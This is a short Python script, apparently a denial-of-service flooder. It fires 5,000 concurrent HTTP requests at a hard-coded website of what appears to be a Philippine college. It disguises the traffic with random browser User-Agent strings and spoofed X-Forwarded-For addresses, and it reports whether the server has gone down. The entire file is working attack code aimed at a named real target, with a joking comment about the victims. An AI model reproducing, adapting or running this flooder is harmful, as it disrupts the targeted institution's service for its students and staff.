import aiohttp
import asyncio
import os
import random
from fake_useragent import UserAgent

TARGET_URL = "https://lacarlotacitycollege.edu.ph/"  #your target URL lol bahala na sila

os.system('cls' if os.name == 'nt' else 'clear')

requests_per_second = 5000  # Adjust the number of concurrent tasks

ua = UserAgent(browsers=['edge', 'chrome'])  # Initialize UserAgent

def generate_random_ip():
    # Generate a random IP address starting with 192
    return f"192.168.{random.randint(0, 255)}.{random.randint(0, 255)}"

async def attack(session, target_url):
    headers = {
        'User-Agent': ua.random,  # Use a random User-Agent string
        'X-Forwarded-For': generate_random_ip()  # Add the random IP address here
    }
    try:
        async with session.get(target_url, headers=headers) as response:
            if response.status == 503:
                print("Server down.")
            elif response.status == 200:
                print("Website still up.")
            else:
                print(f"Unexpected status code: {response.status}")
    except aiohttp.ClientError as e:
        print(f"Client error: {e}")
    except asyncio.TimeoutError:
        print("Request timed out")
    except Exception as e:
        print(f"Unexpected error: {e}")

async def main(target_url):
    async with aiohttp.ClientSession() as session:
        tasks = [attack(session, target_url) for _ in range(requests_per_second)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    if not TARGET_URL:
        print("Please set the TARGET_URL variable.")
    else:
        asyncio.run(main(TARGET_URL))
